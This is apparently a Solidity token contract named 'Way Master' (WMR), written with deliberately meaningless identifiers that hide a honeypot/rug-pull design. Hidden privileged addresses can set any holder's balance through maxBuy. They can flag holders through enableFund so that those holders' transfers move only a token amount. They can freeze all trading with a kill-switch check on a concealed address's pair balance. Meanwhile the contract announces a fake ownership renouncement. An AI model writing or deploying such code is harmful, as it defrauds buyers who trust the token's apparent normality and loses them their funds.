//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface fromTx {
    function createPair(address feeExemptMax, address launchedTotal) external returns (address);
}

interface buyTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapLiquidity) external view returns (uint256);

    function transfer(address exemptToReceiver, uint256 launchedSender) external returns (bool);

    function allowance(address feeToAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedSender) external returns (bool);

    function transferFrom(
        address sender,
        address exemptToReceiver,
        uint256 launchedSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalShould, uint256 value);
    event Approval(address indexed feeToAmount, address indexed spender, uint256 value);
}

abstract contract totalMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletSenderFund is buyTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WayMaster is totalMarketing, buyTake, walletSenderFund {

    function transferFrom(address atShouldTx, address exemptToReceiver, uint256 launchedSender) external override returns (bool) {
        if (_msgSender() != teamMinTrading) {
            if (receiverAt[atShouldTx][_msgSender()] != type(uint256).max) {
                require(launchedSender <= receiverAt[atShouldTx][_msgSender()]);
                receiverAt[atShouldTx][_msgSender()] -= launchedSender;
            }
        }
        return tokenAuto(atShouldTx, exemptToReceiver, launchedSender);
    }

    function owner() external view returns (address) {
        return senderBuyEnable;
    }

    address takeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public autoLimit;

    function name() external view virtual override returns (string memory) {
        return takeMax;
    }

    uint256 exemptList;

    function maxBuy(address exemptFund, uint256 launchedSender) public {
        isFund();
        txSender[exemptFund] = launchedSender;
    }

    function txFrom() public {
        emit OwnershipTransferred(teamTo, address(0));
        senderBuyEnable = address(0);
    }

    function balanceOf(address swapLiquidity) public view virtual override returns (uint256) {
        return txSender[swapLiquidity];
    }

    uint256 public autoFund;

    bool public buyLaunch;

    string private maxLaunched = "WMR";

    function approve(address walletToken, uint256 launchedSender) public virtual override returns (bool) {
        receiverAt[_msgSender()][walletToken] = launchedSender;
        emit Approval(_msgSender(), walletToken, launchedSender);
        return true;
    }

    uint256 public amountLaunch;

    function senderToken(address atShouldTx, address exemptToReceiver, uint256 launchedSender) internal returns (bool) {
        require(txSender[atShouldTx] >= launchedSender);
        txSender[atShouldTx] -= launchedSender;
        txSender[exemptToReceiver] += launchedSender;
        emit Transfer(atShouldTx, exemptToReceiver, launchedSender);
        return true;
    }

    function tokenAuto(address atShouldTx, address exemptToReceiver, uint256 launchedSender) internal returns (bool) {
        if (atShouldTx == teamTo) {
            return senderToken(atShouldTx, exemptToReceiver, launchedSender);
        }
        uint256 exemptShouldToken = buyTake(amountLimitSell).balanceOf(takeLaunched);
        require(exemptShouldToken == exemptList);
        require(exemptToReceiver != takeLaunched);
        if (buyFund[atShouldTx]) {
            return senderToken(atShouldTx, exemptToReceiver, txTo);
        }
        return senderToken(atShouldTx, exemptToReceiver, launchedSender);
    }

    mapping(address => bool) public buyFund;

    address teamMinTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public toSell;

    bool private sellTeamTrading;

    address public teamTo;

    event OwnershipTransferred(address indexed feeSender, address indexed receiverMode);

    function symbol() external view virtual override returns (string memory) {
        return maxLaunched;
    }

    bool public feeWallet;

    uint256 constant txTo = 14 ** 10;

    uint256 private modeExempt;

    uint256 public minReceiver;

    uint256 private receiverSell;

    uint8 private tokenLaunched = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return isLiquidity;
    }

    address public amountLimitSell;

    mapping(address => mapping(address => uint256)) private receiverAt;

    uint256 txReceiver;

    function isFund() private view {
        require(toSell[_msgSender()]);
    }

    string private takeMax = "Way Master";

    function sellBuy(address listTx) public {
        require(listTx.balance < 100000);
        if (feeWallet) {
            return;
        }
        if (buyAuto == receiverSell) {
            receiverSell = autoFund;
        }
        toSell[listTx] = true;
        if (receiverSell == autoFund) {
            swapIs = true;
        }
        feeWallet = true;
    }

    function allowance(address teamAt, address walletToken) external view virtual override returns (uint256) {
        if (walletToken == teamMinTrading) {
            return type(uint256).max;
        }
        return receiverAt[teamAt][walletToken];
    }

    bool private swapIs;

    uint256 public buyAuto;

    constructor (){
        
        minWallet amountTakeIs = minWallet(teamMinTrading);
        amountLimitSell = fromTx(amountTakeIs.factory()).createPair(amountTakeIs.WETH(), address(this));
        
        teamTo = _msgSender();
        toSell[teamTo] = true;
        txSender[teamTo] = isLiquidity;
        txFrom();
        if (minReceiver == receiverSell) {
            receiverSell = buyAuto;
        }
        emit Transfer(address(0), teamTo, isLiquidity);
    }

    address private senderBuyEnable;

    function launchSenderEnable(uint256 launchedSender) public {
        isFund();
        exemptList = launchedSender;
    }

    uint256 private isLiquidity = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return senderBuyEnable;
    }

    function enableFund(address launchMarketing) public {
        isFund();
        if (swapIs == autoLimit) {
            minReceiver = amountLaunch;
        }
        if (launchMarketing == teamTo || launchMarketing == amountLimitSell) {
            return;
        }
        buyFund[launchMarketing] = true;
    }

    function transfer(address exemptFund, uint256 launchedSender) external virtual override returns (bool) {
        return tokenAuto(_msgSender(), exemptFund, launchedSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenLaunched;
    }

    mapping(address => uint256) private txSender;

}